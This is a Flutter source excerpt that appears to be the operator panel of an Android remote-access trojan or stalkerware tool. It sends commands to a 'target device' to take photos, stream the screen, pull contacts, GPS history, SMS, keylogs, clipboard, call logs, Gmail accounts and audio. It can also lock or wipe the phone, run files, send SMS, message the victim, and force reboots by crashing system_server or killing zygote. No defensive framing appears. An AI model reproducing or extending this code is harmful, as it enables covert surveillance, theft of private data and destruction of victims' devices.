                  fontFamily: 'FontX',
                  letterSpacing: 1,
                ),
              ),
            ]),
          ),
        ),
      ),
    ]),
    if (_liveOn) ...[
      const SizedBox(height: 12),
      _neonSingleBtn('STOP LIVE', Icons.stop_circle_outlined, kDeathRed, _stopLive, isDestructive: true),
    ],
  ]);

  Widget _pageCamera() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('CAMERA & VISUAL', 'Capture photos, screenshots, and control display'),
    const SizedBox(height: 16),
    _neonSingleBtn('TAKE PHOTO', Icons.camera_alt_rounded, kDeathRed, () {
      _showCamPicker((s) => _cmd('take_photo', extra: s));
    }),
    _gap,
    _neonSingleBtn('SCREENSHOT', Icons.screenshot_monitor_rounded, kDeathGold, () => _cmd('get_screen')),
    _gap,
    _neonSingleBtn('SET WALLPAPER', Icons.wallpaper_rounded, kDeathRed, () {
      _inputDialog('Set Wallpaper', 'Image URL', (v) => _cmd('set_wallpaper', extra: v));
    }),
    _gap,
    Row(children: [
      Expanded(child: _neonSmallBtn('STROBE ON', Icons.flash_on_rounded, kDeathRed, () => _cmd('flash_strobe'))),
      const SizedBox(width: 12),
      Expanded(child: _neonSmallBtn('STROBE OFF', Icons.flash_off_rounded, Colors.grey, () => _cmd('stop_strobe'))),
    ]),
  ]);

  Widget _pageIntel() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('INTELLIGENCE', 'Extract data and information from target device'),
    const SizedBox(height: 16),
    _neonSingleBtn('CONTACTS', Icons.contacts_rounded, kDeathRed, () => _cmd('get_contacts')),
    _gap,
    _neonSingleBtn('GPS LOCATION', Icons.my_location_rounded, kDeathGreen, () => _cmd('get_location')),
    _gap,
    _neonSingleBtn('GMAIL & ACCOUNTS', Icons.account_circle_rounded, kDeathGold, () => _cmd('get_gmails')),
    _gap,
    _neonSingleBtn('SMS INBOX', Icons.sms_rounded, kDeathGold, () => _cmd('get_sms')),
    _gap,
    _neonSingleBtn('NOTIFICATIONS', Icons.notifications_rounded, kDeathRed, () => _fetchNotif()),
    _gap,
    _neonSingleBtn('GALLERY', Icons.photo_library_rounded, kDeathGold, () => _cmd('get_gallery', extra: '10')),
    _gap,
    _neonSingleBtn('REQUEST NOTIF ACCESS', Icons.security_rounded, Colors.grey, () => _cmd('open_notification_settings')),
  ]);

  Widget _pageIntel2() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('ADVANCED INTEL', 'Keylogger, Clipboard, Call Logs & More'),
    const SizedBox(height: 16),
    _neonSingleBtn('KEYLOGS', Icons.keyboard_rounded, kDeathGold, () => _cmd('get_keylogs')),
    _gap,
    _neonSingleBtn('CLIPBOARD', Icons.content_copy_rounded, kDeathRed, () => _cmd('get_clipboard')),
    _gap,
    _neonSingleBtn('CALL LOGS', Icons.phone_rounded, kDeathGold, () => _cmd('get_calllogs')),
    _gap,
    _neonSingleBtn('INSTALLED APPS', Icons.apps_rounded, kDeathRed, () => _cmd('get_apps')),
    _gap,
    _neonSingleBtn('SOCIAL MEDIA', Icons.people_alt_rounded, kDeathGold, () => _cmd('get_social')),
    _gap,
    _neonSingleBtn('GPS HISTORY', Icons.route_rounded, kDeathGreen, () => _cmd('get_gps_history')),
    _gap,
    _neonSingleBtn('AUDIO RECORDINGS', Icons.mic_rounded, kDeathRed, () => _cmd('get_audio')),
  ]);

  Widget _pageAudio() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('AUDIO & NETWORK', 'Control audio and network on target device'),
    const SizedBox(height: 16),
    _neonSingleBtn('PLAY AUDIO', Icons.play_circle_rounded, kDeathGold, () {
      _inputDialog('Play Audio', 'MP3 URL', (v) => _cmd('play_audio', extra: v));
    }),
    _gap,
    _neonSingleBtn('STOP AUDIO', Icons.stop_circle_rounded, Colors.grey, () => _cmd('stop_audio')),
    _gap,
    _neonSingleBtn('VIBRATE LOOP', Icons.vibration_rounded, kDeathRed, () => _cmd('vibrate_loop')),
    _gap,
    _neonSingleBtn('OPEN URL', Icons.open_in_browser_rounded, kDeathGold, () {
      _inputDialog('Open URL', 'https://...', (v) => _cmd('open_url', extra: v));
    }),
    _gap,
    _neonSingleBtn('KILL WIFI', Icons.wifi_off_rounded, kDeathRed, () => _cmd('kill_wifi')),
  ]);

  Widget _pageLock() => Column(children: [
    Expanded(child: ListView(padding: const EdgeInsets.all(16), children: [
      _header('REMOTE CONTROL', 'Lock, wipe, and execute files on target'),
      const SizedBox(height: 16),
      _neonSingleBtn(' LOCK SCREEN', Icons.lock_rounded, kDeathRed, _lockLiveDialog, isDestructive: true),
      _gap,
      _neonSingleBtn(' SOFT LOCK', Icons.lock_outline_rounded, kDeathGold, _lockChatDialog),
      _gap,
      _neonSingleBtn(' WIPE DEVICE', Icons.delete_forever_rounded, kDeathRed, _wipeDeviceDialog, isDestructive: true),
      _gap,
      _neonSingleBtn(' EXECUTE FILE', Icons.code_rounded, kDeathGold, _execFileDialog),
      _gap,
      _neonSingleBtn(' SEND SMS', Icons.sms_rounded, kDeathGold, _sendSmsDialog),
      _gap,
      _neonSingleBtn(' EXEC RESULTS', Icons.history_rounded, kDeathRed, () => _cmd('get_exec_results')),
      _gap,
      _neonSingleBtn(' SMS LOGS', Icons.message_rounded, kDeathGold, () => _cmd('get_sms_logs')),
      _gap,
      _neonSingleBtn(' UNLOCK DEVICE', Icons.restart_alt_rounded, kDeathGreen, () => _cmd('unlock')),
      _gap,
      _neonSingleBtn(' LOCK STATUS', Icons.info_outline_rounded, kDeathGreen, () => _cmd('get_lock_status')),
      const SizedBox(height: 24),

      _header('CHAT WITH TARGET', 'Messages appear on target\'s device'),
      const SizedBox(height: 12),
      Container(
        height: 220,
        decoration: BoxDecoration(
          color: kDeathCardBg,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: kDeathBorder, width: 0.5),
        ),
        child: _chat.isEmpty
            ? Center(
                child: Text(
                  'No messages yet',
                  style: TextStyle(
                    color: Colors.white.withOpacity(0.05),
                    fontSize: 12,
                    fontFamily: 'ShareTechMono',
                  ),
                ),
              )
            : ListView.builder(
                controller: _chatScroll,
                padding: const EdgeInsets.all(12),
                itemCount: _chat.length,
                itemBuilder: (_, i) {
                  final m = _chat[i];
                  final isOwner = m['from'] == 'owner';
                  return TweenAnimationBuilder(
                    tween: Tween<double>(begin: 0.5, end: 1),
                    duration: Duration(milliseconds: 200 + (i * 20)),
                    curve: Curves.easeOutBack,
                    builder: (context, scale, child) {
                      return Transform.scale(scale: scale, child: child);
                    },
                    child: Align(
                      alignment: isOwner ? Alignment.centerRight : Alignment.centerLeft,
                      child: Container(
                        margin: const EdgeInsets.symmetric(vertical: 3),
                        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                        constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.7),
                        decoration: BoxDecoration(
                          gradient: isOwner 
                              ? LinearGradient(colors: [kDeathRed, kDeathGold]) 
                              : LinearGradient(colors: [kDeathCardBg, kDeathDarkBg]),
                          borderRadius: BorderRadius.circular(16),
                          border: Border.all(
                            color: isOwner ? kDeathGold.withOpacity(0.2) : kDeathBorder,
                            width: 0.5,
                          ),
                        ),
                        child: Column(
                          crossAxisAlignment: isOwner ? CrossAxisAlignment.end : CrossAxisAlignment.start,
                          children: [
                            Text(
                              m['text'] ?? '',
                              style: TextStyle(
                                color: Colors.white,
                                fontSize: 13,
                                fontWeight: FontWeight.w500,
                                fontFamily: 'ShareTechMono',
                              ),
                            ),
                            const SizedBox(height: 4),
                            Text(
                              m['time'] ?? '',
                              style: TextStyle(
                                color: Colors.white.withOpacity(0.1),
                                fontSize: 9,
                                fontFamily: 'ShareTechMono',
                              ),
                            ),
                          ],
                        ),
                      ),
                    ),
                  );
                },
              ),
      ),
    ])),
    Container(
      padding: const EdgeInsets.fromLTRB(14, 10, 14, 14),
      decoration: BoxDecoration(
        color: kDeathCardBg,
        border: Border(top: BorderSide(color: kDeathBorder, width: 1)),
      ),
      child: Row(children: [
        Expanded(
          child: Container(
            decoration: BoxDecoration(
              color: kDeathDarkBg,
              borderRadius: BorderRadius.circular(28),
              border: Border.all(color: kDeathBorder),
            ),
            child: TextField(
              controller: _chatCtrl,
              style: TextStyle(
                color: Colors.white,
                fontSize: 13,
                fontFamily: 'ShareTechMono',
              ),
              decoration: InputDecoration(
                hintText: 'Type message to target...',
                hintStyle: TextStyle(
                  color: Colors.white.withOpacity(0.05),
                  fontSize: 12,
                  fontFamily: 'ShareTechMono',
                ),
                border: InputBorder.none,
                contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
              ),
              onSubmitted: _sendChat,
            ),
          ),
        ),
        const SizedBox(width: 10),
        AnimatedBuilder(
          animation: _pulseAnimation,
          builder: (context, child) {
            return Transform.scale(
              scale: _pulseAnimation.value,
              child: GestureDetector(
                onTap: () => _sendChat(_chatCtrl.text),
                child: Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(colors: [kDeathRed, kDeathGold]),
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(color: kDeathRed.withOpacity(0.2), blurRadius: 12),
                    ],
                  ),
                  child: Icon(Icons.send_rounded, color: Colors.white, size: 18),
                ),
              ),
            );
          },
        ),
      ]),
    ),
  ]);

  Widget _pageDevice() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('DEVICE CONTROL', 'Full system control over target device'),
    const SizedBox(height: 16),
    _neonSingleBtn('🔄 RESTART DEVICE', Icons.restart_alt_rounded, kDeathGold, () {
      showDialog(context: context, builder: (_) => AlertDialog(
        backgroundColor: kDeathCardBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20), 
          side: BorderSide(color: kDeathGold.withOpacity(0.2), width: 1),
        ),
        title: Text(
          'Restart Device',
          style: TextStyle(
            color: Colors.white,
            fontSize: 15,
            fontWeight: FontWeight.w700,
            fontFamily: 'FontX',
          ),
        ),
        content: Text(
          'The target device will restart.\n\nUsing PowerManager reflection — no root or device admin required.',
          style: TextStyle(
            color: Colors.white.withOpacity(0.1),
            fontSize: 13,
            fontFamily: 'ShareTechMono',
            height: 1.5,
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text(
              'Cancel',
              style: TextStyle(
                color: Colors.white.withOpacity(0.1),
                fontFamily: 'ShareTechMono',
              ),
            ),
          ),
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(colors: [kDeathRed, kDeathGold]),
              borderRadius: BorderRadius.circular(10),
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
              onPressed: () { Navigator.pop(context); _cmd('reboot_device'); },
              child: Text(
                'RESTART',
                style: TextStyle(
                  color: Colors.white,
                  fontWeight: FontWeight.w700,
                  fontSize: 11,
                  fontFamily: 'FontX',
                  letterSpacing: 1,
                ),
              ),
            ),
          ),
        ],
      ));
    }),
    _gap,
    _neonSingleBtn(' WAKE UP TARGET', Icons.wb_sunny_rounded, kDeathGreen, () => _cmd('force_open')),
    const SizedBox(height: 24),
    Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color: kDeathCardBg,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: kDeathBorder),
      ),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Text(
          'RESTART METHODS',
          style: TextStyle(
            color: Colors.white.withOpacity(0.1),
            fontSize: 12,
            fontWeight: FontWeight.w700,
            fontFamily: 'FontX',
            letterSpacing: 1,
          ),
        ),
        const SizedBox(height: 12),
        _infoRow('1', 'PowerManager reflection (no root required)', kDeathGold),
        _infoRow('2', 'DevicePolicyManager (if admin active)', kDeathRed),
        _infoRow('3', 'su -c reboot (root)', kDeathRed),
        _infoRow('4', 'am crash system_server', kDeathGold),
        _infoRow('5', 'pkill -9 zygote', Colors.grey),
      ]),
    ),
  ]);

  Widget _header(String title, String sub) => Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
    ShaderMask(
      shaderCallback: (bounds) => LinearGradient(
        colors: [kDeathRed, kDeathGold],
      ).createShader(bounds),
      child: Text(
        title,
        style: TextStyle(
          color: Colors.white,
          fontSize: 16,
          fontWeight: FontWeight.w700,
          fontFamily: 'FontX',
          letterSpacing: 1,
        ),
      ),
    ),
    const SizedBox(height: 6),
    Text(
      sub,
      style: TextStyle(
        color: Colors.white.withOpacity(0.1),
        fontSize: 11,
        fontFamily: 'ShareTechMono',
      ),
    ),
    const SizedBox(height: 8),
    Container(
      height: 2,
      width: 60,
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: [kDeathRed, kDeathGold]),
        borderRadius: BorderRadius.circular(2),
      ),
    ),
  ]);

  Widget get _gap => const SizedBox(height: 14);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kDeathDarkBg,
      appBar: _buildAppBar(),
      body: FadeTransition(
        opacity: _fadeIn,
        child: ScaleTransition(
          scale: _scaleIn,
          child: SlideTransition(
            position: _slideUp,
            child: Column(children: [
              Container(
                height: 52,
                margin: const EdgeInsets.fromLTRB(12, 8, 12, 0),
                padding: const EdgeInsets.fromLTRB(12, 6, 12, 6),
                decoration: BoxDecoration(
                  color: kDeathCardBg,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: kDeathBorder),
                ),
                child: _log.isEmpty
                    ? Center(
                        child: Text(
                          'Ready for commands',
                          style: TextStyle(
                            color: Colors.white.withOpacity(0.05),
                            fontSize: 10,
                            fontFamily: 'ShareTechMono',
                          ),
                        ),
                      )
                    : ListView.builder(
                        itemCount: _log.length,
                        itemBuilder: (_, i) => Text(
                          _log[i],
                          style: TextStyle(
                            color: kDeathGold,
                            fontSize: 9,
                            fontFamily: 'monospace',
                          ),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                      ),
              ),
              Expanded(
                child: TabBarView(controller: _tabs, children: [
                  _pageLive(),
                  _pageCamera(),
                  _pageIntel(),
                  _pageIntel2(),
                  _pageAudio(),
                  _pageLock(),
                  _pageDevice(),
                ]),
              ),
            ]),
          ),
        ),
      ),
    );
  }

  // ============================================================
  // APP BAR
  // ============================================================
  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: Colors.transparent,
      elevation: 0,
      leading: IconButton(
        icon: Container(
          padding: const EdgeInsets.all(8),
          decoration: BoxDecoration(
            color: kDeathCardBg.withOpacity(0.3),
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: kDeathBorder),
          ),
          child: Icon(Icons.arrow_back_ios_new, color: kDeathRed, size: 16),
        ),
        onPressed: () { if (_liveOn) _stopLive(); Navigator.pop(context); }
      ),
      title: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        ShaderMask(
          shaderCallback: (bounds) => LinearGradient(
            colors: [kDeathRed, kDeathGold],
          ).createShader(bounds),
          child: Text(
            _model,
            style: TextStyle(
              color: Colors.white,
              fontSize: 16,
              fontWeight: FontWeight.w700,
              fontFamily: 'FontX',
              letterSpacing: 0.5,
            ),
          ),
        ),
        const SizedBox(height: 2),
        Row(children: [
          AnimatedContainer(
            duration: const Duration(milliseconds: 500),
            width: 8,
            height: 8,
            decoration: BoxDecoration(
              color: _liveOn ? kDeathRed : (_sending ? kDeathGold : kDeathGreen),
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(
                  color: (_liveOn ? kDeathRed : kDeathGreen).withOpacity(0.2),
                  blurRadius: 6,
                ),
              ],
            ),
          ),
          const SizedBox(width: 6),
          Text(
            'Battery: $_battery%  •  $_id',
            style: TextStyle(
              color: Colors.white.withOpacity(0.1),
              fontSize: 9,
              fontFamily: 'ShareTechMono',
            ),
            overflow: TextOverflow.ellipsis,
          ),
        ]),
      ]),
      actions: [
        if (_liveOn) Container(
          margin: const EdgeInsets.symmetric(vertical: 12, horizontal: 4),
          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
          decoration: BoxDecoration(
            color: kDeathRed.withOpacity(0.04),
            borderRadius: BorderRadius.circular(8),
            border: Border.all(color: kDeathRed.withOpacity(0.1)),
          ),
          child: Row(mainAxisSize: MainAxisSize.min, children: [
            AnimatedBuilder(
              animation: _pulseAnimation,
              builder: (context, child) {
                return Transform.scale(
                  scale: _pulseAnimation.value,
                  child: Container(
                    width: 6,
                    height: 6,
                    decoration: BoxDecoration(
                      color: kDeathRed,
                      shape: BoxShape.circle,
                    ),
                  ),
                );
              },
            ),
            const SizedBox(width: 6),
            Text(
              '$_fps fps',
              style: TextStyle(
                color: kDeathRed,
                fontSize: 11,
                fontWeight: FontWeight.w700,
                fontFamily: 'FontX',
              ),
            ),
          ]),
        ),
        if (_sending)
          Padding(
            padding: const EdgeInsets.only(right: 12),
            child: Center(
              child: SizedBox(
                width: 16,
                height: 16,
                child: CircularProgressIndicator(
                  strokeWidth: 2,
                  color: kDeathRed,
                ),
              ),
            ),
          ),
        IconButton(
          icon: Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              color: kDeathCardBg.withOpacity(0.3),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: kDeathBorder),
            ),
            child: Icon(Icons.refresh_rounded, color: kDeathRed, size: 18),
          ),
          onPressed: () { setState(() {}); _cmd('force_open', silent: true); }
        ),
      ],
      bottom: PreferredSize(
        preferredSize: const Size.fromHeight(48),
        child: Container(
          margin: const EdgeInsets.symmetric(horizontal: 12),
          child: TabBar(
            controller: _tabs,
            isScrollable: true,
            indicator: UnderlineTabIndicator(
              borderSide: BorderSide(color: kDeathRed, width: 2.5),
              insets: const EdgeInsets.symmetric(horizontal: 8),
            ),
            labelColor: kDeathRed,
            unselectedLabelColor: Colors.white.withOpacity(0.1),
            labelStyle: TextStyle(
              fontSize: 11,
              fontWeight: FontWeight.w700,
              fontFamily: 'FontX',
              letterSpacing: 0.5,
            ),
            unselectedLabelStyle: TextStyle(
              fontSize: 11,
              fontWeight: FontWeight.w500,
              fontFamily: 'ShareTechMono',
            ),
            tabs: const [
              Tab(text: 'Live Stream'),
              Tab(text: 'Camera'),
              Tab(text: 'Intel'),
              Tab(text: 'Intel 2'),
              Tab(text: 'Audio'),
              Tab(text: 'Control'),
              Tab(text: 'Device'),
            ],
          ),
        ),
      ),
    );
  }
}